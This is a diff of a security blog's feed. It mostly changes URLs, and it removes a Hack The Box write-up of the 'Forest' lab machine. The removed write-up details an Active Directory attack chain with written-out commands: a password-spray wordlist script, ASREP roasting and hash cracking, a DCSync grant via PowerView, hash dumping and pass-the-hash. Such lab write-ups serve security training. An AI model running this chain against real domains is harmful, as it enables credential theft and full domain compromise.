   <li><strong>Microsoft Support</strong> for the mitigation guide (https://support.microsoft.com/en-gb/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429)</li>
-</ol>]]></content><author><name></name></author><summary type="html"><![CDATA[Introduction &amp; Attack Anatomy]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Resolute (AD Pentesting Track #5)</title><link href="http://localhost:4000/2022/04/25/Resolute.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Resolute (AD Pentesting Track #5)" /><published>2022-04-25T00:00:00+02:00</published><updated>2022-04-25T00:00:00+02:00</updated><id>http://localhost:4000/2022/04/25/Resolute</id><content type="html" xml:base="http://localhost:4000/2022/04/25/Resolute.html"><![CDATA[<p><img src="/assets/Resolute/Resolute.png" alt="Resolute" /></p>
+</ol>]]></content><author><name></name></author><summary type="html"><![CDATA[Introduction &amp; Attack Anatomy]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Resolute (AD Pentesting Track #5)</title><link href="https://omnisl4sh.github.io/2022/04/25/Resolute.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Resolute (AD Pentesting Track #5)" /><published>2022-04-25T00:00:00+02:00</published><updated>2022-04-25T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/25/Resolute</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/25/Resolute.html"><![CDATA[<p><img src="/assets/Resolute/Resolute.png" alt="Resolute" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -1904,7 +2203,7 @@ sc.exe start dns
   <li>Also, copying the <code class="language-plaintext highlighter-rouge">msfvenom</code> generated locally on the machine dll didn’t work because the antivirus kept eating it up xD</li>
 </ul>
 
-<p><img src="/assets/Resolute/evil-dll-eaten.jpg" alt="evil-dll-eaten" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Blackfield (AD Pentesting Track #4)</title><link href="http://localhost:4000/2022/04/18/Blackfield.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Blackfield (AD Pentesting Track #4)" /><published>2022-04-18T00:00:00+02:00</published><updated>2022-04-18T00:00:00+02:00</updated><id>http://localhost:4000/2022/04/18/Blackfield</id><content type="html" xml:base="http://localhost:4000/2022/04/18/Blackfield.html"><![CDATA[<p><img src="/assets/Blackfield/Blackfield.png" alt="BlackField" /></p>
+<p><img src="/assets/Resolute/evil-dll-eaten.jpg" alt="evil-dll-eaten" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Blackfield (AD Pentesting Track #4)</title><link href="https://omnisl4sh.github.io/2022/04/18/Blackfield.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Blackfield (AD Pentesting Track #4)" /><published>2022-04-18T00:00:00+02:00</published><updated>2022-04-18T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/18/Blackfield</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/18/Blackfield.html"><![CDATA[<p><img src="/assets/Blackfield/Blackfield.png" alt="BlackField" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -2180,7 +2479,7 @@ expose %abuse% z:
 
 <p><em>having the domain administrator’s hash,</em> we can easily remote in using <strong>PowerShell Remoting</strong> and we’re admin on the box :D</p>
 
-<p><img src="/assets/Blackfield/got-admin.jpg" alt="got-admin" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Easy] - Active (AD Pentesting Track #3)</title><link href="http://localhost:4000/2022/04/14/Active.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Easy] - Active (AD Pentesting Track #3)" /><published>2022-04-14T00:00:00+02:00</published><updated>2022-04-14T00:00:00+02:00</updated><id>http://localhost:4000/2022/04/14/Active</id><content type="html" xml:base="http://localhost:4000/2022/04/14/Active.html"><![CDATA[<p><img src="/assets/Active/Active.png" alt="Active" /></p>
+<p><img src="/assets/Blackfield/got-admin.jpg" alt="got-admin" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Easy] - Active (AD Pentesting Track #3)</title><link href="https://omnisl4sh.github.io/2022/04/14/Active.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Easy] - Active (AD Pentesting Track #3)" /><published>2022-04-14T00:00:00+02:00</published><updated>2022-04-14T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/14/Active</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/14/Active.html"><![CDATA[<p><img src="/assets/Active/Active.png" alt="Active" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -2357,344 +2656,4 @@ SMB         10.10.10.100    445    DC               Users
 
 <p>We verify we have code execution with <strong>impacket</strong>’s <code class="language-plaintext highlighter-rouge">psexec.py</code></p>
 
-<p><img src="/assets/Active/got-admin.jpg" alt="got-admin" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Easy] - Forest (AD Pentesting Track #1)</title><link href="http://localhost:4000/2022/04/08/Forest.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Easy] - Forest (AD Pentesting Track #1)" /><published>2022-04-08T00:00:00+02:00</published><updated>2022-04-08T00:00:00+02:00</updated><id>http://localhost:4000/2022/04/08/Forest</id><content type="html" xml:base="http://localhost:4000/2022/04/08/Forest.html"><![CDATA[<p><img src="/assets/Forest/Forest.png" alt="forest" /></p>
-
-<h3 id="summary">Summary</h3>
-<ul>
-  <li>A Domain Controller machine. <strong>Anonymous LDAP</strong> is enabled which we use to get <strong>a full list of AD users</strong>.</li>
-  <li><em>After performing an</em> <strong>ASREPRoast attack</strong>, we end up with a user that has <strong>PowerShell Remoting Access</strong>.</li>
-  <li><em>Using</em> <strong>BloodHound</strong> <em>for</em> <strong>Domain Enumeration</strong>, we find that the user is member of the <strong>Account Operators</strong> group which <em>gives him the privilege of adding users to AD groups other than Domain Admins etc.</em></li>
-  <li>We add our user to a group called <strong>‘Exchange Windows Permissions’</strong> which has a <strong>write DACL</strong> over the domain.</li>
-  <li><em>Abusing this privilege</em> lets us give ourselves the <strong>DCSync right</strong> over the domain using <strong>PowerView</strong> which <em>lets us grab all its NTLM hashes</em></li>
-  <li>We use the Domain <em>Administrator’s hash</em> in a simple <strong>Pass-the-Hash</strong> attack to gain full access.</li>
-</ul>
-
-<hr />
-
-<h3 id="nmap">Nmap</h3>
-<p>We start off doing a <em>comprehensive</em> nmap scan with <strong>default scripts</strong> and <strong>service detection</strong></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE      VERSION
-53/tcp    open  domain       Simple DNS Plus
-88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-04-05 19:09:07Z)
-135/tcp   open  msrpc        Microsoft Windows RPC
-139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
-389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
-445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
-464/tcp   open  kpasswd5?
-593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
-636/tcp   open  tcpwrapped
-3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
-3269/tcp  open  tcpwrapped
-5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-9389/tcp  open  mc-nmf       .NET Message Framing
-47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-49664/tcp open  msrpc        Microsoft Windows RPC
-49665/tcp open  msrpc        Microsoft Windows RPC
-49666/tcp open  msrpc        Microsoft Windows RPC
-49667/tcp open  msrpc        Microsoft Windows RPC
-49671/tcp open  msrpc        Microsoft Windows RPC
-49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
-49677/tcp open  msrpc        Microsoft Windows RPC
-49684/tcp open  msrpc        Microsoft Windows RPC
-49703/tcp open  msrpc        Microsoft Windows RPC
-49967/tcp open  msrpc        Microsoft Windows RPC
-Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-| smb2-time: 
-|   date: 2022-04-05T19:10:01
-|_  start_date: 2022-04-05T18:45:37
-| smb-security-mode: 
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: required
-| smb-os-discovery: 
-|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
-|   Computer name: FOREST
-|   NetBIOS computer name: FOREST\x00
-|   Domain name: htb.local
-|   Forest name: htb.local
-|   FQDN: FOREST.htb.local
-|_  System time: 2022-04-05T12:10:02-07:00
-| smb2-security-mode: 
-|   3.1.1: 
-|_    Message signing enabled and required
-|_clock-skew: mean: 2h26m50s, deviation: 4h02m31s, median: 6m49s
-</code></pre></div></div>
-
-<h3 id="domain-controller-detected">Domain Controller Detected</h3>
-
-<p>We find a collection of ports that give us a high probability that this is windows machine and a domain controller:</p>
-<ul>
-  <li>DNS on port 53</li>
-  <li>Kerberos on port 88</li>
-  <li>SMB on port 445</li>
-  <li>LDAP on port 636</li>
-  <li>Global Catalog on port 3268</li>
-  <li>WinRM on port 5985</li>
-</ul>
-
-<p>From the nmap script <code class="language-plaintext highlighter-rouge">smb-os-discovery</code>, the domain name should be <code class="language-plaintext highlighter-rouge">htb.local</code></p>
-
-<h3 id="fetching-a-list-of-all-ad-users">Fetching a list of all AD users</h3>
-
-<p>We want to start enumerating users. So we use an impacket tool called <code class="language-plaintext highlighter-rouge">GetADUsers.py</code>.</p>
-
-<p>The command is: <code class="language-plaintext highlighter-rouge">GetADUsers.py -dc-ip 10.10.10.161 "htb.local/" -all</code></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
-
-[*] Querying 10.10.10.161 for information about domain.
-Name                  Email                           PasswordLastSet      LastLogon           
---------------------  ------------------------------  -------------------  -------------------
-Administrator         Administrator@htb.local         2021-08-30 20:51:58.690463  2022-04-05 14:46:24.124409 
-Guest                                                 &lt;never&gt;              &lt;never&gt;             
-DefaultAccount                                        &lt;never&gt;              &lt;never&gt;             
-krbtgt                                                2019-09-18 06:53:23.467452  &lt;never&gt;             
-$331000-VK4ADACQNUCA                                  &lt;never&gt;              &lt;never&gt;             
-SM_2c8eef0a09b545acb  SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.local  &lt;never&gt;              &lt;never&gt;             
-SM_ca8c2ed5bdab4dc9b  SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.local  &lt;never&gt;              &lt;never&gt;             
-SM_75a538d3025e4db9a  SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.local  &lt;never&gt;              &lt;never&gt;             
-SM_681f53d4942840e18  DiscoverySearchMailbox{D919BA05-46A6-415f-80AD-7E09334BB852}@htb.local  &lt;never&gt;              &lt;never&gt;             
-SM_1b41c9286325456bb  Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local  &lt;never&gt;              &lt;never&gt;             
-SM_9b69f1b9d2cc45549  FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.local  &lt;never&gt;              &lt;never&gt;             
-SM_7c96b981967141ebb  SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.local  &lt;never&gt;              &lt;never&gt;             
-SM_c75ee099d0a64c91b  SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@htb.local  &lt;never&gt;              &lt;never&gt;             
-SM_1ffab36a2f5f479cb  SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@htb.local  &lt;never&gt;              &lt;never&gt;             
-HealthMailboxc3d7722  HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local  2019-09-23 18:51:31.892097  2019-09-23 18:57:12.361516 
-HealthMailboxfc9daad  HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local  2019-09-23 18:51:35.267114  2019-09-23 18:52:05.736012 
-HealthMailboxc0a90c9  HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local  2019-09-19 07:56:35.206329  &lt;never&gt;             
-HealthMailbox670628e  HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local  2019-09-19 07:56:45.643993  &lt;never&gt;             
-HealthMailbox968e74d  HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local  2019-09-19 07:56:56.143969  &lt;never&gt;             
-HealthMailbox6ded678  HealthMailbox6ded67848a234577a1756e072081d01f@htb.local  2019-09-19 07:57:06.597012  &lt;never&gt;             
-HealthMailbox83d6781  HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local  2019-09-19 07:57:17.065809  &lt;never&gt;             
-HealthMailboxfd87238  HealthMailboxfd87238e536e49e08738480d300e3772@htb.local  2019-09-19 07:57:27.487679  &lt;never&gt;             
-HealthMailboxb01ac64  HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local  2019-09-19 07:57:37.878559  &lt;never&gt;             
-HealthMailbox7108a4e  HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local  2019-09-19 07:57:48.253341  &lt;never&gt;             
-HealthMailbox0659cc1  HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local  2019-09-19 07:57:58.643994  &lt;never&gt;             
-sebastien                                             2019-09-19 20:29:59.544725  2019-09-22 18:29:29.586227 
-lucinda                                               2019-09-19 20:44:13.233891  &lt;never&gt;             
-svc-alfresco                                          2022-04-05 15:18:27.420771  2019-09-23 07:09:47.931194 
-andy                                                  2019-09-22 18:44:16.291082  &lt;never&gt;             
-mark                                                  2019-09-20 18:57:30.243568  &lt;never&gt;             
-santi                                                 2019-09-20 19:02:55.134828  &lt;never&gt; 
-</code></pre></div></div>
-
-<p><em>Because LDAP Anonymous access is enabled,</em> this gets us <strong>all</strong> the users in the domain. The ones below look organic enough for us to try spraying.</p>
-<ul>
-  <li>Administrator</li>
-  <li>sebastien</li>
-  <li>lucinda</li>
-  <li>svc-alfresco</li>
-  <li>andy</li>
-  <li>mark</li>
-  <li>santi</li>
-</ul>
-
-<h3 id="wordlist-generation-from-common-username-schemes">Wordlist generation from common username schemes</h3>
-
-<p><em>Since we need a wordlist,</em> We create a basic one from the most common passwords (like “P@ssw0rd” etc.) and from <strong>commonly used password convention schemes</strong> like:</p>
-<ul>
-  <li>Season + Year</li>
-  <li>Season + Year + !</li>
-  <li>Season + Special Char + Year</li>
-  <li>Company Name + Year</li>
-  <li>Company Name + Year + !</li>
-  <li>Company Name + Special Char + Year</li>
-</ul>
-
-<p>We will pretend that <code class="language-plaintext highlighter-rouge">Forest</code> is the company name even though it’s a CTF. Because that’s what I would do in a real pentest :D
-Also, the year this machine has been launched is 2019. So we will use that year as well as a couple of years around it (2017, 2018, 2020 and 2021).</p>
-
-<p>I write a quick <code class="language-plaintext highlighter-rouge">PowerShell</code> script for this:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$CompanyName = "Forest"
-$Seasons = 'Summer', 'Winter', 'Spring', 'Fall'
-$Years = 2017..2021
-$Special_Chars = '!@#$%^&amp;*'.ToCharArray()
-$Wordlist = @()
-
-Foreach($Year in $Years){
-	$Wordlist += "$CompanyName$Year"
-	$Wordlist += "$CompanyName$Year!"
-	Foreach($Season in $Seasons){
-		$Wordlist += "$Season$Year"
-		$Wordlist += "$Season$Year!"
-		Foreach($Char in $Special_Chars){
-			$Wordlist += "$Season$Char$Year"
-			$Wordlist += "$CompanyName$Char$Year"
-		}
-	}
-}
-</code></pre></div></div>
-
-<p><em>Running that script,</em> I get a list of 370 passwords to try. Not bad :D</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>..SNIP..
-Forest2019
-Forest2019!
-Summer2019
-Summer2019!
-Summer!2019
-Forest!2019
-Summer@2019
-Forest@2019
-Summer#2019
-Forest#2019
-Summer$2019
-Forest$2019
-Summer%2019
-..SNIP..
-</code></pre></div></div>
-
-<h3 id="enumerating-domain-password-policy-before-password-spraying">Enumerating domain password policy before password spraying</h3>
-
-<p>I then use <code class="language-plaintext highlighter-rouge">crackmapexec</code> to obtain the password policy. We don’t want to lock everyone one out XD</p>
-
-<p><img src="/assets/Forest/CME-Pass-Pol.jpg" alt="CME-Pass-Pol" /></p>
-
-<p>We see that <code class="language-plaintext highlighter-rouge">Account Lockout Threshold: None</code> and <code class="language-plaintext highlighter-rouge">Domain Password Lockout Admins: 0</code>. This is amazing! we can definitely bruteforce without any problems :D</p>
-
-<p>We start the spray using:
-<code class="language-plaintext highlighter-rouge">crackmapexec smb 10.10.10.161 -u users.txt -p passwords.txt --continue-on-success</code></p>
-
-<p>But we get no luck with that :/</p>
-
-<h3 id="asreproasting">ASREPRoasting</h3>
-
-<p><em>Having no credentials,</em> we can still try an attack called <code class="language-plaintext highlighter-rouge">ASREP Roasting</code>. This attack would let us grab the hashes of accounts that <strong>don’t require Kerberos PreAuthentication.</strong></p>
-
-<p>we run this attack using impacket’s <code class="language-plaintext highlighter-rouge">GetNPUsers.py</code> script:</p>
-
-<p><code class="language-plaintext highlighter-rouge">GetNPUsers.py htb.local/ -usersfile users.txt -format hashcat -outputfile asrep-hashes.txt</code></p>
-
-<p>This is after we set <code class="language-plaintext highlighter-rouge">10.10.10.161</code> as our name server in <code class="language-plaintext highlighter-rouge">/etc/resolv.conf</code>. We do this because impacket does DNS lookups in the background.</p>
-
-<p><img src="/assets/Forest/etc-resolv.jpg" alt="etc-resolv" /></p>
-
-<p><img src="/assets/Forest/asrep-roast.jpg" alt="asrep-roast" /></p>
-
-<p>notice that the user <code class="language-plaintext highlighter-rouge">svc-alfresco</code> doesn’t show in the script console output. I’m not sure why xD but the hash was pushed out to the <code class="language-plaintext highlighter-rouge">asrep-hashes.txt</code> file.</p>
-
-<h3 id="cracking-tgt-with-john">Cracking TGT with <code class="language-plaintext highlighter-rouge">John</code></h3>
-
-<p>we use <code class="language-plaintext highlighter-rouge">john</code> to crack the hash and the password for <code class="language-plaintext highlighter-rouge">svc-alfresco</code> turns out to be <code class="language-plaintext highlighter-rouge">s3rvice</code></p>
-
-<p><img src="/assets/Forest/cracked.jpg" alt="cracked" /></p>
-
-<p><em>in case you were wondering,</em> the wordlist I used <code class="language-plaintext highlighter-rouge">gegalist.txt</code> is just one big list of all the passwords on <code class="language-plaintext highlighter-rouge">Seclists</code> (https://github.com/danielmiessler/SecLists/tree/master/Passwords) concatenated and cleaned up. I use it for all hash cracking. It’s only 21,377,691 passwords. Just kidding, it’s a pretty fat list XD</p>
-
-<p>Alright, here is our first set of creds:</p>
-<ul>
-  <li>Username: htb.local\svc-alfresco</li>
-  <li>Password: s3rvice</li>
-</ul>
-
-<h3 id="remote-code-execution">Remote Code Execution</h3>
-
-<p>We first try to login using <code class="language-plaintext highlighter-rouge">crackmapexec</code> using the <code class="language-plaintext highlighter-rouge">SMB</code> module. But that doesn’t work. This is because <code class="language-plaintext highlighter-rouge">svc-alfresco</code> isn’t a local administrator on the machine. So we try another approach for remote code execution. This time using a tool called <code class="language-plaintext highlighter-rouge">evil-winrm</code> (https://github.com/Hackplayers/evil-winrm)</p>
-
-<p><img src="/assets/Forest/evil-winrm.jpg" alt="evil-winrm" /></p>
-
-<p>it works like a charm, this is because we’re a member of the builtin group of <code class="language-plaintext highlighter-rouge">Remote Management Users</code></p>
-
-<p><img src="/assets/Forest/groups.jpg" alt="groups" /></p>
-
-<h3 id="privilege-escalation">Privilege Escalation</h3>
-
-<p><em>Right after,</em> we get down to enumeration for privesc</p>
-
-<ol>
-  <li>we look for interesting files in user profiles –&gt; nothing</li>
-  <li>we check for interesting directories in <code class="language-plaintext highlighter-rouge">c:\</code> –&gt; nothing</li>
-  <li>we check processes –&gt; nothing interesting there</li>
-  <li>we check services –&gt; access denied</li>
-  <li>we run systeminfo to get information on the kernel –&gt; access denied</li>
-  <li>we check for saved creds with <code class="language-plaintext highlighter-rouge">cmdkey /list</code> –&gt; nothing</li>
-  <li>we check our privileges with <code class="language-plaintext highlighter-rouge">whoami /privs</code> –&gt; nothing special there</li>
-  <li>we run WinPEAS (https://github.com/carlospolop/PEASS-ng) and still don’t find anything</li>
-</ol>
-
-<p>but …</p>
-
-<p><em>going back to our group memberships,</em> we do find ourselves in quite a few interesting groups:</p>
-<ol>
-  <li>Account Operators –&gt; this can let us create AD accounts and add them to groups other than high privilege ones (Administrators, Domain Admins etc.) (https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators)</li>
-  <li>Privileged IT Accounts –&gt; this is not a standard AD group and we would want to know what those <em>Privileges</em> are :D</li>
-  <li>Service Accounts –&gt; this too might be interesting</li>
-</ol>
-
-<h3 id="domain-enumeration-with-bloodhound">Domain Enumeration with BloodHound</h3>
-
-<p><em>since we’re in a an Active Directory environment,</em> a standard tool to use is <code class="language-plaintext highlighter-rouge">BloodHound</code> (https://github.com/BloodHoundAD/BloodHound). It can help us identify paths to escalate our privileges inside a domain context. We will use it show us what can be done using the privileges that we hold.</p>
-
-<p><em>in order to supply bloodhound with the information it needs,</em> we will need to run a tool called <code class="language-plaintext highlighter-rouge">SharpHound</code> (https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) to collect details about the domain.</p>
-
-<p>We upload it to the machine using <code class="language-plaintext highlighter-rouge">evil-winrm</code>’s <code class="language-plaintext highlighter-rouge">upload</code> function and run it using the <code class="language-plaintext highlighter-rouge">-c all</code> flag to perform all collection methods.</p>
-
-<p><img src="/assets/Forest/Sharphound-collection.jpg" alt="Sharphound-collection" /></p>
-
-<p>We’re going to transfer the data (<code class="language-plaintext highlighter-rouge">20220405150628_BloodHound.zip</code>) over to our kali machine in order to feed it to <code class="language-plaintext highlighter-rouge">bloodhound</code>.</p>
-
-<p>We do that using impacket’s <code class="language-plaintext highlighter-rouge">smbserver.py</code></p>
-
-<p><img src="/assets/Forest/smb-server.jpg" alt="smb-server" /></p>
-
-<p>and then mount it on the victim machine use the <code class="language-plaintext highlighter-rouge">net use</code> command, moving the <code class="language-plaintext highlighter-rouge">.zip</code> file and then unmounting the share.</p>
-
-<p><img src="/assets/Forest/mounting-smb.jpg" alt="mounting-smb" /></p>
-
-<p><em>afterwards,</em> we upload the file into <code class="language-plaintext highlighter-rouge">bloodhound</code> and start checking what we can do having owned the <code class="language-plaintext highlighter-rouge">svc-alfresco</code> service account. we run the <code class="language-plaintext highlighter-rouge">shortest path from owned principles</code> query:</p>
-
-<p><img src="/assets/Forest/bloodhound-query.jpg" alt="bloodhound-query" /></p>
-
-<p>This query shows us no real path to being a domain admin. So we try another query: <code class="language-plaintext highlighter-rouge">Shortest Paths to High Value Targets</code></p>
-
-<p><img src="/assets/Forest/bloodhound-query-2.jpg" alt="bloodhound-query-2" /></p>
-
-<h3 id="abusing-membership-in-account-operators--the-high-privileges-of-exchange-windows-permissions-ad-groups">Abusing membership in <code class="language-plaintext highlighter-rouge">Account Operators</code> &amp; the high privileges of <code class="language-plaintext highlighter-rouge">Exchange Windows Permissions</code> AD groups</h3>
-
-<p>It looks horrible at first. <em>But, after taking a closer look,</em> we notice that our account <em>being in the</em> <code class="language-plaintext highlighter-rouge">account operators</code> <em>group</em> can add a member to a certain group called <code class="language-plaintext highlighter-rouge">Exchange Windows Permissions</code> which happens to have <code class="language-plaintext highlighter-rouge">WriteDACL</code> on <code class="language-plaintext highlighter-rouge">htb.local</code> (<strong>The entire domain!</strong>). <em>Having that privilege</em> means we can abuse it to give ourselves the <code class="language-plaintext highlighter-rouge">DCSync</code> right that we can use to dump all the domain hashes!</p>
-
-<p><img src="/assets/Forest/path-to-DA.jpg" alt="path-to-DA" /></p>
-
-<p><img src="/assets/Forest/abuse-write-dacl.jpg" alt="abuse-write-dacl" /></p>
-
-<p>we add our user to that group using a powershell command: <code class="language-plaintext highlighter-rouge">Add-ADGroupMember 'Exchange Windows Permissions' -members 'svc-alfresco'</code></p>
-
-<p><img src="/assets/Forest/adding-to-group.jpg" alt="adding-to-group" /></p>
-
-<p>we then upload <code class="language-plaintext highlighter-rouge">PowerView.ps1</code> (https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) to the victim machine and import it using <code class="language-plaintext highlighter-rouge">import-module .\PowerView.ps1</code>. This enables access to all the powershell cmdlets included within that module.</p>
-
-<h3 id="checking-the-help-for-the-add-domainobjectacl-command">Checking the help for the <code class="language-plaintext highlighter-rouge">Add-DomainObjectAcl</code> command</h3>
-
-<p>we view the help page and usage examples of the abuse command <code class="language-plaintext highlighter-rouge">Add-DomainObjectAcl</code> using <code class="language-plaintext highlighter-rouge">Get-Help Add-DomainObjectAcl -Examples</code></p>
-
-<p><img src="/assets/Forest/abuse-command-help.jpg" alt="abuse-command-help" /></p>
-
-<p>we notice that we need to create a Powershell <code class="language-plaintext highlighter-rouge">Credential Object</code> and run the command to give our user <code class="language-plaintext highlighter-rouge">svc-alfresco</code> <code class="language-plaintext highlighter-rouge">DCSync</code> rights over <code class="language-plaintext highlighter-rouge">htb.local</code>. It should be as below:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$SecPassword = ConvertTo-SecureString 's3rvice'-AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('HTB.local\svc-alfresco', $SecPassword)
-Add-DomainObjectAcl -TargetIdentity "dc=htb,dc=local" -PrincipalIdentity 'HTB.local\svc-alfresco' -Rights DCSync -Credential $Cred -Verbose
-</code></pre></div></div>
-
-<p>This takes a little while to run but we eventually have permission to dump hashes.</p>
-
-<h3 id="and-down-the-hashes-go">And down the hashes go…</h3>
-
-<p>We use impacket’s <code class="language-plaintext highlighter-rouge">secretsdump.py</code> and voala! :D</p>
-
-<p><img src="/assets/Forest/hashes_dumped.jpg" alt="hashes_dumped" /></p>
-
-<h3 id="pass-the-hash-for-the-win-">Pass-the-Hash for the win :)</h3>
-
-<p><em>Using the administrator NTLM hash,</em> we can use <code class="language-plaintext highlighter-rouge">evil-winrm</code> to remote inside and we’re done with the box :D</p>
-
-<p><img src="/assets/Forest/got-admin.jpg" alt="got-admin" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>
+<p><img src="/assets/Active/got-admin.jpg" alt="got-admin" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>
